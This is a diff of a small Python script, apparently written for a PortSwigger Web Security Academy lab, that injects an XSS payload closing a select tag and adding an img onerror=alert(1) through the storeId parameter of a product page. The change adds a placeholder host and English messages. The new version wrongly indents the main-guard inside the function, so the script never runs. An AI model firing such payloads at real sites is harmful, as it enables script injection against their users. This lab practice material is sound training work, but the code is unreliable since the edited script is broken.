@@ -1,6 +1,6 @@
 import requests
 
-HOST = "0a7b002503f7512280bc94b8007100a8.web-security-academy.net"
+HOST = "LAB-ID.web-security-academy.net"
 BASE_URL = f"https://{HOST}"
 HEADERS = {
     "Host": HOST,
@@ -16,20 +16,19 @@ HEADERS = {
     "Sec-Fetch-Site": "cross-site"
 }
 
-XSS_PAYLOAD = '"></select><img%20src=1%20onerror=alert(1)>'
+payload = '"></select><img%20src=1%20onerror=alert(1)>'
 
-def send_xss_payload():
-    url = f"{BASE_URL}/product?productId=1&storeId={XSS_PAYLOAD}"
-
-    print(f"[+] Отправляю запрос на {url}")
-    response = requests.get(url, headers=HEADERS)
-
+def injection():
+    url = f"{BASE_URL}/product?productId=1&storeId={payload}"
+    print(f"sending request to {url}")
+    response = requests.get(url,headers=HEADERS)
+    
     if response.status_code == 200:
-        print("[+] Запрос отправлен успешно!")
-        print("Ответ сервера:")
-        print(response.text[:500]) 
+        print("Yep! Request has submitted successfully!")
+        print("Server's response:")
+        print(response.text[:500]) #show only begin 500 characters of response
     else:
-        print(f"[-] error code: {response.status_code}")
-
-if __name__ == "__main__":
-    send_xss_payload()
+        print(f"Error: server's code response: {response.status_code}")
+        
+    if __name__ == "__main__":
+        injection() 
